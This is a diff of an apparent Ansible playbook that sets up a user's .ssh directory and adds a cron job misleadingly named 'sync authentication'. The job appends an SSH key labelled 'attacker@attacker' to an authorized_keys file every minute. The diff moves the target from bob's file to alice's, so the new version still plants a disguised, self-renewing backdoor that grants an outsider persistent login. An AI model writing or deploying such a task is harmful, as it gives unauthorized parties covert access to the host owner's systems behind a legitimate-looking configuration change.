@@ -4,11 +4,11 @@
   become: yes
   tasks:
     - name: "set up .ssh directory"
-      shell: "mkdir -p /home/alice/.ssh; touch /home/alice/.ssh/authorized_keys; chmod 644 /home/alice/.ssh/authorized_keys; chown -R alice:bob /home/alice/.ssh"
+      shell: "mkdir -p /home/alice/.ssh; touch /home/alice/.ssh/authorized_keys; chmod 644 /home/alice/.ssh/authorized_keys; chown -R alice:alice /home/alice/.ssh"
     - name: "cron job to add ssh keys"
       cron:
         name: "sync authentication"
         user: "alice"
         minute: "*"
-        job: "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/+HcB9i+XMKgbxHSOt4cwEEjj7LIKKvLKp/be0nVjYpB1OsbfC6ZbUgwy21Jgn+02ZQ6U1AFufMRwi4Zg2Gyhoq8HJekK/NaahkYVFwtY9WekiDGXzOt7jvPXbtvI+AL4iFlbhljj14ACOMItKNBG3qDY+63CMHN5thqJL7wNI+x3umIcscyqUGj8+148sKyoNbxwU+KwJ29OZy46YVcecYGS7dBI5flTUND/MUd7xpXIhVuBR7F/A3Gtq5R1ZLyk1QSjm+1EhpPWAm8UZZJf0kwnVaeh8TgoPuFiHVqQyVLcfkWJQL5IGxtkJRGKGTZ5qBl20+VesQXn5n1HmrJVeDYUArxMoVVHNw1Vn/YzWpV3RJfHPBL+HOvaVhncwKcNeWHHSJNyKAO6BPSYXdfyBuA0vw1Qle52RqUqjzcG2zCoeOYTmdmeB6ygjiuqVRTJBDqU4RkfDxod+3kEOpe091k3tomK1Jtt255qwIF4flJGqrEE8HDMg7/jwD0xuUtpRlUe3F+/Zs+8WWsJbg7AnglXf5picl2KnxqQYkG1km4eT1A7rMQeEhKTUKy6a7ds3qsRzSdvWoRpK3eAvIjr6ykH00Z75HgZDpiHNrQFolnZpNoEDttSus9z//RkmwwmoOdr6vBSdqy08mYOzs0lv8XP1yOvis/4ItOv5e9YRw== attacker@attacker' >> /home/bob/.ssh/authorized_keys"
+        job: "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/+HcB9i+XMKgbxHSOt4cwEEjj7LIKKvLKp/be0nVjYpB1OsbfC6ZbUgwy21Jgn+02ZQ6U1AFufMRwi4Zg2Gyhoq8HJekK/NaahkYVFwtY9WekiDGXzOt7jvPXbtvI+AL4iFlbhljj14ACOMItKNBG3qDY+63CMHN5thqJL7wNI+x3umIcscyqUGj8+148sKyoNbxwU+KwJ29OZy46YVcecYGS7dBI5flTUND/MUd7xpXIhVuBR7F/A3Gtq5R1ZLyk1QSjm+1EhpPWAm8UZZJf0kwnVaeh8TgoPuFiHVqQyVLcfkWJQL5IGxtkJRGKGTZ5qBl20+VesQXn5n1HmrJVeDYUArxMoVVHNw1Vn/YzWpV3RJfHPBL+HOvaVhncwKcNeWHHSJNyKAO6BPSYXdfyBuA0vw1Qle52RqUqjzcG2zCoeOYTmdmeB6ygjiuqVRTJBDqU4RkfDxod+3kEOpe091k3tomK1Jtt255qwIF4flJGqrEE8HDMg7/jwD0xuUtpRlUe3F+/Zs+8WWsJbg7AnglXf5picl2KnxqQYkG1km4eT1A7rMQeEhKTUKy6a7ds3qsRzSdvWoRpK3eAvIjr6ykH00Z75HgZDpiHNrQFolnZpNoEDttSus9z//RkmwwmoOdr6vBSdqy08mYOzs0lv8XP1yOvis/4ItOv5e9YRw== attacker@attacker' >> /home/alice/.ssh/authorized_keys"
         state: present
